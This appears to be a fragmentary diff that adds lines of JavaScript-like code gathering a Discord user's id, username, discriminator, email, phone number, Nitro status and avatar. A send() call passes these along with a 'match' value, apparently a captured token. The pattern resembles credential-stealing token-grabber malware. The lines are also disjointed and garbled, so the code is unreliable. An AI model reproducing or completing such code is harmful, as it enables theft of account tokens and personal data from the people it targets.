@@ -1,0 +1,7 @@
+resp.json()
+response.id
+!response.premium_type
+nitro = "Sem nitro"
+response.premium_type === 1
+response.premium_type === 2
+send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro, response.avatar)
